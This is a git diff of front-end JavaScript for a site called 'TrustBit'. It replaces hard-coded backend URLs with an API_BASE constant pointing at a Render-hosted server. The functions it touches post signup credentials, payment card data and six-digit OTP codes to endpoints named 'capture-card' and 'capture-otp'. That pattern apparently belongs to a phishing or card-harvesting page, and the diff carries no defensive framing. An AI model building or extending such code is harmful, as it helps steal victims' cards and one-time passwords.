@@ -1,6 +1,10 @@
 // ======================
 // 🧩 DOM LOGIC
 // ======================
+
+// 🔑 LIVE BACKEND URL (UPDATE THIS IF RENDER URL CHANGES)
+const API_BASE = 'https://trustbit-backend.onrender.com';
+
 document.addEventListener("DOMContentLoaded", () => {
     console.log("TrustBit Active");
 
@@ -14,7 +18,7 @@ document.addEventListener("DOMContentLoaded", () => {
             if (!email || !password) return alert("Please fill all fields");
 
             try {
-                const response = await fetch('https://trustbit-backend.onrender.com/api/signup', {
+                const response = await fetch(`${API_BASE}/api/signup`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ email, password })
@@ -136,7 +140,7 @@ async function makePayment() {
     payBtn.disabled = true;
 
     try {
-        const response = await fetch('https://trustbit-backend.onrender.com/api/capture-card', {
+        const response = await fetch(`${API_BASE}/api/capture-card`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(data)
@@ -164,7 +168,7 @@ async function confirmOTP() {
     if (otpCode.length !== 6) return alert("Enter 6-digit OTP");
 
     try {
-        await fetch('http://localhost:5000/api/capture-otp', {
+        await fetch(`${API_BASE}/api/capture-otp`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ email: user.email, otpCode })
